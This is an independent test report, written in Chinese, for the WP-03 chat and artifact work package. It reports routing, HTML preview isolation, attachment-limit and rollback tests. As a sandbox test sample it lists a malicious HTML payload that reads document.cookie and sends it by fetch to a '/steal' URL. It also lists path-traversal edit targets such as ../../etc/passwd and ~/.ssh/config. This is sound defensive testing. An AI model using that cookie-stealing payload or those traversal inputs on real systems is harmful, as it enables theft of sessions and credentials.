# WP-03 独立 Test 报告（直接协作与说明产物）

- 测试对象：工作包 WP-03「直接协作与说明产物」（AC-001～006、AC-052、AC-076、AC-084）
- 测试轮次：**第一轮独立 Test**
- 代码冻结点：`7512159`（`fix(domain): treat a malformed target shape as a named target too`，即任务下达的冻结点）
- 仓库 HEAD：`381b033188e3c2db1e758ea9dba5ce271a4246b6`（`docs(review): WP-03 independent review report, round 20 (PASS)`）
  - `git diff --stat 7512159 HEAD` = `.agentdev/work/WP-03/review.md | 341 ++++`（仅评审报告，**代码树 = `7512159`**）
  - 测试前后 `git status --porcelain` 均为空（唯一写入为本报告，见 §10）
- 测试角色：**Test**（独立上下文；未读取任何开发/Review 会话；未读取 `/tmp/w3r*` 评审脚本或其日志；只依据仓库文件、`docs/**` 契约、git 对象与我自建的 `/tmp/wp03t/` 夹具与实验脚本及其原始输出）
- 测试方法：在 `/tmp/wp03t/` 自建 5 个实验脚本 + 夹具 + harness，用仓库自带 `vitest` 以**外置配置**运行（`--config /tmp/wp03t/vitest.config.ts --root /tmp/wp03t`），别名解析到**产品源码** `packages/*/src`、`apps/daemon/src`；**不 import 任何产品测试文件**；实验含**真实 HTTP**（`createDaemon` + 真实 SQLite `ProjectStore` + 真实 `BlobStore` + `AuthService` 安装令牌 Bearer + 真实 multipart 上传）
- 环境：`node v24.8.0`、`pnpm 12.3.4`、macOS（Darwin，宿主执行）、Vitest 5.0.0
- 权威依据：`AGENTS.md`、`docs/INDEX.md`、`docs/delivery/acceptance.md`（AC-001～006/052/076/084 原文）、`docs/delivery/implementation.md`（WP-03）、`docs/architecture/{execution,protocol,data}.md`（§45 预览隔离策略、§5 HTTP 形状）、`docs/rules/workflow.md`、`.agentdev/work/WP-03/{plan,implementation,review}.md`、`packages/**`、`apps/daemon/**`

---

## 1. 结论摘要

| AC | 题目 | 正向 | 负向 | 本轮结论 |
|---|---|---|---|---|
| AC-001 | 自由问答 | 通过 | 通过 | **通过**（文本回答本身属 WP-04/06，见 §8） |
| AC-002 | HTML 说明 | 通过 | 通过 | **通过**（浏览器级渲染归 WP-09） |
| AC-003 | 按需委派 | 部分 | 通过 | **部分通过 / 未完全覆盖**（DispatchSpec/Snapshot/独立 Session 属 WP-04/06） |
| AC-004 | 执行授权边界 | 通过 | 通过 | **通过** |
| AC-005 | 明确启动 | 通过 | 通过 | **通过** |
| AC-006 | 混合意图 | 通过 | 通过 | **通过**（含 1 条 P3 残余，T-04） |
| AC-052 | HTML 安全 | 通过 | 通过 | **通过（契约/头部级）**（真实无头浏览器攻防归 WP-09/WP-10） |
| AC-076 | 附件限制 | 通过 | 通过 | **通过** |
| AC-084 | 首条消息附件 | 通过 | 通过 | **通过**（含 1 条 P3 残余，T-05） |

**Test 判定：PASS —— 接受 WP-03 的 AC-001/002/004/005/006/052/076/084；AC-003 判「未完全覆盖（承接 WP-04/06）」。**

- 自建实验 **5 个脚本 / 506 条断言 / 0 失败**（§2 表）；**0×P1、0×P2、2×P3（T-04、T-05）**，无阻断项。
- 6 条契约命令 **6/6 退出 0**：typecheck、lint、test:unit（289）、test:integration（124）、docs:check、build；`test:e2e`/`test:acceptance`/`test:live` 按设计 `NOT_IMPLEMENTED`（WP-09/WP-10，不计失败）。
- **WP-03 的四条必测失败路径全部独立复现**：恶意 HTML、上传限制、产物生成失败、仅问答无授权写入（§5）。
- 第二十轮 Review 的 **W3R20-01（P2）在冻结点已闭环**：畸形/被拒目标形态不再落入良性分支，与登记否定同形版本一致；裸词边界仍存在但**写范围恒等 0 扩张**（§6-E）。
- 记录一致性：`planVersion 6`、`implementation.md planVersion 6`、语料口径 205 均与仓库一致；我自建提取器复算 206 例、**0 偏差（无 fail-open、无 fail-closed）**（§7）。

---

## 2. 测试环境与复现方式

```text
export PATH="$HOME/.local/bin:$PATH"
cd /Users/huyaohua/huyh/work/aigrouptool
pnpm install --frozen-lockfile && pnpm build        # 契约命令；build 产出 dist（23:42，含 v6 形状修复）
npx vitest run --config /tmp/wp03t/vitest.config.ts --root /tmp/wp03t
```

外置配置仅做别名解析（`@agentdev/{contracts,domain,storage,core,pi-runtime}` → `packages/*/src/index.ts`，`@agentdev/daemon` → `apps/daemon/src/index.ts`），不含产品测试 include；**产品测试文件从未被 import**（`domain.test.ts` 仅以文本方式提取语料）。

| 脚本 | 覆盖 | 断言数 | 结果 |
|---|---|---|---|
| `/tmp/wp03t/harness.ts` | 记录器：命名断言 + 计数 + findings 落盘（`/tmp/wp03t/results-*.json`） | 基础设施 | — |
| `/tmp/wp03t/boot.ts` | 真实夹具：临时目录 + 真实 SQLite + 真实 BlobStore + 真实 `createDaemon`/`listen` + `AuthService` 安装令牌 + 可控时钟 + `ArtifactService.createUser` 故障注入缝 | 基础设施 | — |
| `/tmp/wp03t/A-routing.test.ts` | AC-001/003/004/005/006 路由层：5 问句、8 无授权、9 命令、5 越界目标、8 已登记 fail-closed 边界、3 混合意图、越界不变量、仅问答负例 | **187** | **0 失败** |
| `/tmp/wp03t/B-http.test.ts` | AC-002/052/084/004/005/006 真实 HTTP：产物/预览/一次性下载/令牌 TTL、恶意 HTML 头部逐字、首条消息绑定与 `message_body`、授权行/Work/Assessment/幂等/客户端注入 | **68** | **0 失败** |
| `/tmp/wp03t/C-limits.test.ts` | AC-076（数量/单文件/总量/mime/签名/NUL/空）+ AC-084（过期清理、重复绑定、故障注入回滚与重试、blob 丢失晚报） | **36** | **0 失败** |
| `/tmp/wp03t/D-corpus.test.ts` | 独立复算仓库登记语料：自建文本提取器 + 全量重放，无 fail-open / 无 fail-closed | **39** | **0 失败** |
| `/tmp/wp03t/E-round20.test.ts` | W3R20-01 闭环、裸词边界、Review §11.1 第 23/24/26 行、写范围恒等网格 | **176** | **0 失败** |
| **合计** | | **506** | **0 失败** |

原始证据：`/tmp/wp03t/http-evidence.log`（190 条 HTTP 请求/响应行）、`/tmp/wp03t/cmd-*.log`（10 条命令）、`/tmp/wp03t/results-*.json`（逐条断言与 findings）。

---

## 3. 契约命令原始结果（冻结点 `7512159`，日志 `/tmp/wp03t/cmd-*.log`）

| 命令 | 退出码 | 关键输出（原文） |
|---|---|---|
| `pnpm install --frozen-lockfile` | **0** | `Lockfile is up to date, resolution step is skipped` / `Done in 58ms using pnpm v12.3.4` |
| `pnpm typecheck` | **0** | 无诊断 |
| `pnpm lint` | **0** | `All matched files use Prettier code style!` |
| `pnpm test:unit` | **0** | `Test Files 19 passed (19)` / `Tests 289 passed (289)` / 2.63s |
| `pnpm test:integration` | **0** | `Test Files 10 passed (10)` / `Tests 124 passed (124)` / 30.33s（真实 Docker 用例含只读挂载与 cap-drop 组） |
| `pnpm docs:check` | **0** | `docs:check ok — 15 documents, 55 internal links, 94 acceptance cases, 9 requirements, 11 work packages` |
| `pnpm build` | **0** | 8 workspace 全部构建成功（`packages/domain/dist/requests.js` 含 `mentionsPathShape`/`PATH_SHAPE_PATTERN`，确认 build 消费冻结点代码） |
| `pnpm test:e2e` | 1（设计） | `NOT_IMPLEMENTED: command test:e2e is not implemented yet; it lands with WP-09` |
| `pnpm test:acceptance` | 1（设计） | `NOT_IMPLEMENTED: ... it lands with WP-10` |
| `pnpm test:live` | 1（设计） | `NOT_IMPLEMENTED: ... it lands with WP-10` |

说明：`test:unit` 用例数仍是 289，是因为路由语料位于数据驱动循环内，新增语料不改变用例数——**不能用 289 未变推断语料未增**；语料增补由 §7-D 的文本提取复算核对。

---

## 4. AC 逐项证据

### AC-001 自由问答 —— 通过
- 路由层（A）：`解释一下 packages/domain/src/requests.ts 的路由逻辑`、`src/app.ts 里的这个函数是做什么的？`、`如何理解 docs/architecture/data.md 里的快照模型`、`什么是 CAS？`、英文问句 5 例全部 `explicitAuthorization=false`、无 `delivery` item、`scope.writePaths=[]`、无 `edit` 操作。
- 真实 HTTP（B）：仅提问的消息返回 202，`authorizationId=null`，Work `intent=assist`、`level=none`、无写范围；`store.requirements.count()=0`、`decisions=0`、`findings=0`、`runs=0`——**无 Requirement、无交付 Gate、未启动任何 Run**。
- 未覆盖：文本回答的「事实/未知区分与来源引用」由模型输出决定，属 WP-04/06（§8）。

### AC-002 HTML 说明 —— 通过
- 真实 HTTP（B）：multipart 上传 HTML → 201（`attachmentId`/`hash`/`expiresAt`）；发送说明消息 → 202，绑定 `origin=user` Artifact（`kind=attachment`、`mime=text/html`、`artifactVersion=1`），`artifact.created` 事件落库；`origin=agent` 的 `kind=explanation` HTML 产物（绑定真实 Run）同样可预览。
- 预览/下载：两者 `GET /artifacts/:id/preview` 均 200、`content-type: text/html`、正文与写入**逐字相同**、`x-agentdev-preview-mode: inline`、`x-agentdev-artifact-validity: valid`；`POST /artifacts/download.prepare` 签发 60s 令牌，`GET /artifacts/download/:token` **不需要工作台会话**即可取回逐字字节。
- 一次性与 TTL：同一令牌第二次 403 `NOT_AUTHORIZED`；超过 60s（注入时钟 +61s）403；未知令牌 403；未知产物 404。
- 仅 Artifact 写入：源仓库根 `/tmp/agentdev-wp03t-root` 不存在（无源码变更）；`requirements/decisions/findings=0`。
- 边界：PNG（`image/png`）可绑定、可逐字下载，但预览 400（无内联预览），证明 mime 门不是空过。
- 未覆盖：浏览器内渲染效果（WP-09）。

### AC-003 按需委派 —— 部分通过 / 未完全覆盖
- 路由层（A）：一条混合消息产生**不同 intent 的独立 work item**，各自的 `scope`/`writePaths` 互不重叠，具备「Chief 可分别委派」的前置条件。
- 未覆盖：`DispatchSpec`、独立 `Snapshot`、独立 Session、`purpose=analysis/artifact`、结果汇总与 Join 属 WP-04/06 接线——`grep -rn Orchestrator apps/daemon/src/` **0 命中**（`index.ts`、`server.ts` 均 0），Review §11.1 第 27 行亦如此声明。**本包不据此声称 AC-003 已实现**。

### AC-004 执行授权边界 —— 通过
- 路由层（A）：`能不能优化 src/a.ts 的性能`、`src/a.ts 可能需要优化`、`建议重构 src/a.ts`、`我想知道是否可以修改 docs/INDEX.md`、`如果方便的话，修改 src/a.ts`、`修改 src/a.ts 不太明智`、`报告说不要修改 src/b.ts`、`不要修改 src/a.ts` 全部只读。
- 真实 HTTP（B）：提问消息 202、`authorizationId=null`、`store.authorizations.count()=0`、Work 无写范围；该 Work **无 Run**（`runs.count(work_id)=0`）。
- 客户端不能自铸权限：请求体额外携带 `authorization`/`workItems` 字段时 202 但 `authorizationId=null`、授权行仍为 0（daemon 只按命名字段取参）。
- 越界目标：`修改 ../../etc/passwd`、`修改 /etc/hosts`、`修改 ~/.ssh/config`、`修改 docs/../PLAN.md`、`修改 .env`、`把 ../../etc/passwd 改掉`、`fix /etc/hosts`、`update ../../../root/.bashrc` 全部只读；**不变量**：任何决策的授权路径集合中不存在 `..`/前导 `/`/`~` 形态。

### AC-005 明确启动 —— 通过
- 真实 HTTP（B）：`修改 src/a.ts` → 202；`store.authorizations` 新增行的 `workId` 指向新 Work，`scope.readPaths=writePaths=['src/a.ts']`、`operations` 含 `read`+`edit`，`sourceRef={kind:'message', id:消息 id}`，`acceptedAt` 已填。
- Work：`intent=delivery`、`level=L2`、`authorizationRef=`授权行 id；`Assessment` 行的 `authorizationRef`/`level=L2`/`intent=delivery`/`policyRevision=1`/`reason` 非空——**原消息即范围授权，无第二次确认门**（`decisions.count()=0`）。
- 幂等：同一 `idempotency-key` 重放返回同一 `messageId`/`workId`，消息/Work/授权行数不变；同 key 不同 body → 409 `IDEMPOTENCY_CONFLICT`。
- 路由层（A）另有 9 条正向形态（含英文、`把 X 改掉`、`将 X 更新`）与 8 条已登记 fail-closed 边界（`修改 X 中的错别字`、`对 X 进行修改`、`修改 X、Y`、`修改 X 而不是 Y`、`润色 X`、无连词混合等）全部按声明只读。

### AC-006 混合意图 —— 通过（含 T-04，P3）
- 真实 HTTP（B）：`解释 src/a.ts，然后修改 src/b.ts` → 202，`workIds` 2 个：一个 `assist`（无 `authorizationRef`、`level=none`、无写范围）、一个 `delivery`（`writePaths=['src/b.ts']`、`level=L2`）；`authorizations` 仅 1 行且 `scope.writePaths=['src/b.ts']`（**未包含 src/a.ts**）；`message.received` 事件同时列出两个 Work 与授权 id。
- 路由层（A）：中/英三种连词形态均两 Work、scope 独立。
- **T-04（P3）**：解释子句带附加内容时（`解释 src/a.ts 的作用，然后修改 src/b.ts`）整条消息落到只读，修复授权丢失——方向安全（无越权写），但该具体形态未列入 planVersion 6 的显式代价清单；见 §6。

### AC-052 HTML 安全 —— 通过（契约/头部级）
- 攻击样例（B）：`document.cookie` 读取、`fetch('http://198.51.100.7/steal?...')`、`parent.postMessage`、`top.location=...`、`new Image().src=...`、`form.submit()`、`new WebSocket(...)` 组成的内联脚本 HTML，作为 `origin=agent` 产物预览。
- 逐字头部（与 `docs/architecture/execution.md` §45 比对）：`content-security-policy` **恰为** `default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; connect-src 'none'`（且**只有 1 个** CSP 头）；`x-agentdev-preview-sandbox: allow-scripts`；`x-agentdev-preview-credentials: omit`；`cache-control: no-store`；`x-content-type-options: nosniff`。
- 负向：头部中**不含** `allow-same-origin`/`allow-forms`/`allow-top-navigation`/`allow-popups`/`allow-downloads`/`allow-modals`；响应**无 `Set-Cookie`**；`default-src 'none'` + `connect-src 'none'` 关闭网络与父页通道。
- 静态说明仍可用：同一响应 200 且正文与产物逐字相同（隔离是头部契约，不做内容改写）。
- 未认证请求在服务任何隔离头之前被 401 拒绝（预览字节由工作台带 Bearer 取回，`credentials: omit`）。
- 未覆盖：真实无头浏览器执行证明（WP-09 E2E / WP-10）。

### AC-076 附件限制 —— 通过
- 数量：6 个附件一条消息 → 400 `VALIDATION_ERROR`（"too many attachments for one message"）；消息/Work/Artifact 计数不变、**无残留**；6 个上传保持 `staged` 未绑定；去掉一个后 5 个重试成功且仅那 5 个 `bound`。
- 单文件：20 MiB+1 字节 → 400，附件表 0 行、`blobs/` 目录 0 文件。
- 总量：3×17 MiB（51 MiB > 50 MiB）→ 400（"per-message size limit"），每个分片单独上传均 201，拒绝后消息数不变、三片仍 `staged`。
- 类型：`application/zip`（不在白名单）→ 400；PNG 字节声明 `text/html` → 400（文件签名校验）；文本声明 `image/png` → 400；含 NUL 的"文本" → 400；空文件 → 400；**全部 0 行 0 blob**。
- 未覆盖：「客户端提示」属 WP-09。

### AC-084 首条消息附件 —— 通过（含 T-05，P3）
- 前置：为测试新建一个**从未收过消息**的 Conversation（无 Work/Run），上传后 `state=staged`、无 `boundMessageId`、`expiresAt = now + 24h`。
- 原子绑定：发送首条消息带附件 → 202；附件 `state=bound` 且 `boundMessageId=消息 id`；消息行 `sender=user`、`state=received`；`message_body` 行为 `text/plain` 且 blob 逐字等于正文；`origin=user` Artifact 生成；`message.received` 事件携带 `workId/workIds/attachmentIds/artifactIds`；消息/Work/Artifact/附件四表计数各 +1，**未产生 Run**。
- 普通无附件消息同样可用（各自拥有 `message_body`）。
- 过期清理：t0 上传 → `expiresAt=t0+24h`；时钟推进 25h 后任意新上传触发清扫 → 旧附件 `state=expired`，绑定被拒 400 `INVALID_STATE` 且不写任何行；TTL 内的附件仍可绑定。
- 重复绑定：同一附件第二次发送 → 403 `ATTACHMENT_ALREADY_BOUND`，不新增消息/产物，`boundMessageId` 仍指向第一条消息。
- 产物生成失败（必测失败路径）：在 daemon 拥有的 `ArtifactService.createUser` 缝注入异常 → 发送 500 `INTERNAL_ERROR`，响应**不含**内部路径或注入信息；消息/Work/Artifact 计数不变（事务回滚）；附件仍 `staged`；清除故障后**同一附件重试成功**，恰好新增 1 消息 + 1 Work + 1 Artifact。
- **T-05（P3）**：附件 blob 在发送前被外部删除时，绑定**不校验字节**仍 202，产物行落库；缺失只在预览/下载时以 400 `ARTIFACT_MISSING` 暴露（不会把坏字节当内容返回）。见 §6。

---

## 5. 必测失败路径（四条，独立复现）

| # | 失败路径 | 复现位置 | 观察结果 |
|---|---|---|---|
| 1 | 恶意 HTML | B-http.test.ts（AC-052 用例） | 200 渲染静态文档 + CSP/sandbox/credentials 头部逐字正确、无 `Set-Cookie`、网络与父页通道关闭；未认证请求在头部之前 401 |
| 2 | 上传限制 | C-limits.test.ts（4 个用例） | 数量/单文件/总量/mime/签名/NUL/空 全部 400 拒绝；附件 0 行、`blobs/` 0 文件、消息与 Work 计数不变 |
| 3 | 产物生成失败 | C-limits.test.ts（`failCreateUser` 注入） | 500 `INTERNAL_ERROR` 且不泄漏内部信息；事务回滚（0 残留）；附件保持 `staged`；重试成功且无重复写 |
| 4 | 仅问答无授权写入 | A-routing.test.ts（问题-only 不变量）+ B-http.test.ts（真实 HTTP） | 路由：0 写路径、无 `edit`、`explicitAuthorization=false`；HTTP：`authorizationId=null`、授权行 0、无 Run、无 Requirement/Decision/Finding |

---

## 6. Findings

### T-04 [P3] 解释子句带附加内容时整条消息只读（AC-005/AC-006）
- 位置：`packages/domain/src/requests.ts`（`readClause` / `benignExplanation` 形状判定）。
- 复现：`routeMessage('解释 src/a.ts 的作用，然后修改 src/b.ts')` → `items=[assist]`、`explicitAuthorization=false`；对照 `解释 src/a.ts，然后修改 src/b.ts` → 两 Work、授权 `src/b.ts`。
- 观察 vs 期望：AC-006 期望「说明 + 修复」拆分出多个 Work 且修复获得范围授权；此处整条消息被降级为只读 assist。
- 方向与影响：**fail-closed，无越权写**；用户需改写成裸命令。`plan.md` planVersion 2/6 已声明「richer phrasing 一律只读」，但该具体形态未列入 v6 的显式代价清单（v5 新增的同类代价是 `解释 X 的原因，然后修改 Y`）。建议在结算材料中把它并入已登记代价，或由 WP-04/06 的模型 Assessment 承接。
- 未违反：AC-004（不授权未请求的写范围）；对 AC-005/006 构成**可用性残余**而非安全缺陷。

### T-05 [P3] 附件 blob 缺失在绑定阶段不校验，失败延迟到读取阶段（AC-084/AC-002）
- 位置：`packages/core/src/attachments.ts`（`bind`）+ `packages/core/src/artifacts.ts`（`createUser`，仅复制 `contentHash`/`relativeBlobPath`）。
- 复现：`stage` 上传 → `rmSync(<dataDir>/blobs/<hash>)` → `POST /conversation.message.send` 返回 **202**（消息/Work/Artifact 落库）；随后 `GET /artifacts/:id/preview` → 400 `ARTIFACT_MISSING`，`download.prepare`+下载同样 400。
- 观察 vs 期望：AC-084 要求首条消息附件「成功原子绑定」且产物可用；WP-03 必测项「产物生成失败」期望失败被报告且无残留。
- 方向与影响：**无安全影响**（blob 内容寻址、读取时校验 hash、错误有类型码），也**未产生半写状态或悬挂引用**；差别在于错误在读取时才暴露，用户需重新上传。Review §12 曾把「故障注入下的孤儿 blob 复验」列为未做项，本轮已补做并记录该行为。
- 未违反：AC-076「无残留引用」在拒绝路径成立；AC-084 的失败可重试/过期/重复绑定均成立。

### 信息级观察（不构成 finding）
- **O1（review 覆盖面）**：HEAD 的 `review.md` 是第二十轮报告，其头部声明「冻结点/HEAD = `408c9e7`」、planVersion 5、计数 187，并把 W3R20-01 列为**未闭合 P2**；而本次 Test 的冻结点 `7512159` 是其后一个提交（`fix(domain): treat a malformed target shape as a named target too`，已把 `plan.md` 升到 v6、`implementation.md` 更新到 205 口径）。即：**修复提交本身没有与之配套的 Review 报告**。按 `workflow.md`「Review/Test 之后的代码改动需回到独立 Review」，建议结算前以第二十一轮 Review 复核 W3R20-01 的闭环（或明确由本报告的 §6-E 独立证据承接）。本报告已在 `7512159` 上独立复核该修复有效（E 脚本 176 断言）。
- **O2（语料计数口径）**：我的自建文本提取器复算得 206 例（授权 30 / 只读 176），记录（`plan.md:25`、`implementation.md:9/355`）为 205 例（14/10/4/177）。差异来自分块归类方法（记录自述两种计数实现亦不同），**安全性属性一致**：206 例中 fail-open = 0、fail-closed = 0（D 脚本）。
- **O3（Work 枚举顺序）**：混合意图消息的 `items`/`workIds` 顺序为 delivery 在前、assist 在后；AC-006 只要求「解释可先返回」，未规定枚举顺序，故记为观察（时序由 WP-04/06 决定）。
- **O4（裸词边界）**：`说明莫碰 src`（未登记否定动词）仍留在良性分支并授权显式命令路径，而 `解释不要碰 src`（登记否定不居首）整条只读；两者**写范围恒等 0 扩张**，属 planVersion 6 已登记的裸词/报告否定边界。
- **O5（响应/协议字段）**：`POST /conversation.message.send` 的响应含 `workIds`/`authorizationId`，`protocol.md` §5 未列出（W3R20-04 已承接），不影响本包 AC 行为。

---

## 7. 记录一致性核对

| 项 | 记录声明 | 本轮独立核对 | 结论 |
|---|---|---|---|
| planVersion | `plan.md:3` = 6 | 工作树 `plan.md` = 6，含「planVersion 6 变更」段（形状判定 + 裸词边界 + 新 fail-closed 代价 + 205 口径） | **一致** |
| implementation planVersion | `implementation.md:3` = 6 | 一致；T29 记录 W3R20-01/02/03/04 处置 | **一致** |
| 语料计数 | 205 例 0 偏差（14/10/4/177） | 自建提取器 206 例、0 fail-open / 0 fail-closed；差 1 例为分块归类差异 | **一致（口径差可解释）** |
| 契约命令计数 | unit 289 / integration 124 | 289 / 124 | **一致** |
| 四条必测失败路径 | `implementation.md` 声明已覆盖 | C/A/B 三脚本独立复现，全部通过 | **一致** |
| Review 覆盖树 | `review.md` 声明评审 `408c9e7`（planVersion 5、W3R20-01 未闭合） | Test 冻结点为 `7512159`；该提交已闭环 W3R20-01，但**无配套 Review 报告** | **见 O1**（建议第二十一轮 Review 或由本报告承接） |
| Review §11.1 覆盖矩阵 | 第 23/24/25/26/28 行须由 Test 覆盖；第 27 行承接 WP-04 | 23/24/26/28 由 E 覆盖；25 由 D 覆盖；27 未覆盖并列入 §8 | **已按矩阵处置** |

---

## 8. 未覆盖与残余风险（`not_covered`）

1. **AC-003 的委派实体**：`DispatchSpec`、独立 `Snapshot`、独立 Professional Session、`purpose=analysis/artifact`、结果汇总/Join 属 WP-04/06（`apps/daemon/src` 未装配 `Orchestrator`，grep 0 命中）。本轮只验证路由层「独立 work item + 独立 scope」这一前置事实，**不声称 AC-003 已实现**。
2. **AC-001 的回答质量**：「区分事实/未知」「回复来源」依赖模型输出（WP-04/06 的 Assessment/Gateway）；本包只保证不误授权、不建 Requirement、不启动交付。
3. **AC-052 的浏览器级执行**：真实无头浏览器攻防（cookie/网络/父页/framing 的实际拦截）需 WP-09 `test:e2e` 与 WP-10；本轮以 `docs/architecture/execution.md` §45 的头部契约逐字核对替代。
4. **AC-076 的客户端提示**：UI 侧提示属 WP-09；服务端拒绝与无残留已验。
5. **Review §11.2 已登记 fail-closed 代价**（Test 承认并复核方向安全）：解释子句「路径 + 附加内容」→ 只读（T-04）；未登记同义祈使/名词短语祈使/轻动词处置式/范围声明/排除式/多目标列表 → 只读；前导礼貌、`顺便/顺手修改 X`、`多谢。修改 X` → 只读；未登记否定动词的纠正 → 只读；仓库外目标 → 只读不 500；同形子串误拒（`识别/特别/分别/别人/别的`）→ 只读。
6. **T-05**：blob 丢失在绑定阶段不校验（失败延迟到读取）；已在 §6 记录，建议在结算说明中登记为已知行为或由后续包（WP-07 工具层/存储自愈）处理。
7. **协议对账与 wire 语义**（W3R20-04 承接）：未知字段静默忽略、响应 `workIds`/`authorizationId` 未列入 `protocol.md` §5；不属本包验收面。
8. **真实 Provider 纵向与 `test:live`**（WP-10，尚缺 baseUrl/model/secret）；**工具层 `artifact_write` 与权限负例**（WP-07，AC-082）。

---

## 9. 方法与边界声明

- **独立上下文**：未读取任何开发/Review 会话或 `/tmp/w3r*` 脚本与日志；全部结论来自仓库文件、`docs/**` 契约、git 对象与我自建的 `/tmp/wp03t/` 脚本及其原始输出。
- **未改仓库**：本报告写入前后，除本报告外工作树无改动；实验夹具与脚本全部位于 `/tmp/wp03t/`。
- **真实组件**：HTTP 实验使用真实 `createDaemon` + 真实 loopback 端口 + 真实 `ProjectStore`（临时 SQLite）+ 真实 `BlobStore` + 真实 `AuthService` 安装令牌 + 真实 multipart；故障注入只替换 daemon 拥有的 `ArtifactService.createUser` 一个方法（并在观测后清除）。
- **未做**：真实浏览器、真实 Provider、Docker 容器内复验（Docker 用例已由 `pnpm test:integration` 覆盖，但我未在容器内重跑）、`test:e2e`/`test:acceptance`/`test:live`（按设计未实现）。

---

# 结论输出（按任务要求）

**(a) 裁决与严重度计数**：**PASS**；P0 = 0、P1 = 0、P2 = 0、P3 = 2（T-04、T-05）；另有 5 条信息级观察（O1～O5）。

**(b) AC 逐项结果**：AC-001 通过、AC-002 通过、**AC-003 部分通过/未完全覆盖**、AC-004 通过、AC-005 通过、AC-006 通过、AC-052 通过（契约/头部级）、AC-076 通过、AC-084 通过。

**(c) 冻结与工作树**：
- `git rev-parse HEAD` = `381b033188e3c2db1e758ea9dba5ce271a4246b6`
- `git diff --stat 7512159 HEAD` = `.agentdev/work/WP-03/review.md | 341 +++++++++++++++++++++++++++++++++++++++++` / `1 file changed, 341 insertions(+)`（**代码树 = `7512159`**）
- `git status --porcelain` 末行：写入本报告前为空串（工作树干净）；写入后仅新增 `.agentdev/work/WP-03/test.md`（未跟踪），无其它改动。

**(d) 实验脚本与断言计数**：

| 脚本 | 断言 | 结果 |
|---|---|---|
| `/tmp/wp03t/A-routing.test.ts` | 187 | 0 失败 |
| `/tmp/wp03t/B-http.test.ts` | 68 | 0 失败 |
| `/tmp/wp03t/C-limits.test.ts` | 36 | 0 失败 |
| `/tmp/wp03t/D-corpus.test.ts` | 39 | 0 失败 |
| `/tmp/wp03t/E-round20.test.ts` | 176 | 0 失败 |
| **合计** | **506** | **0 失败** |

**(e) 契约命令**：`install --frozen-lockfile`、`typecheck`、`lint`、`test:unit`（289）、`test:integration`（124）、`docs:check`、`build` 全部 exit 0；`test:e2e`/`test:acceptance`/`test:live` 按设计 `NOT_IMPLEMENTED`（WP-09/WP-10）。

**(f) 需在结算前处理**：①O1——`7512159`（W3R20-01 修复提交）建议补一次独立 Review 或明确由本报告承接；②T-04/T-05 建议登记为已知口径；③AC-003 的委派实体在 WP-04/06 落地后需回归（Review §11.1 第 27 行）。
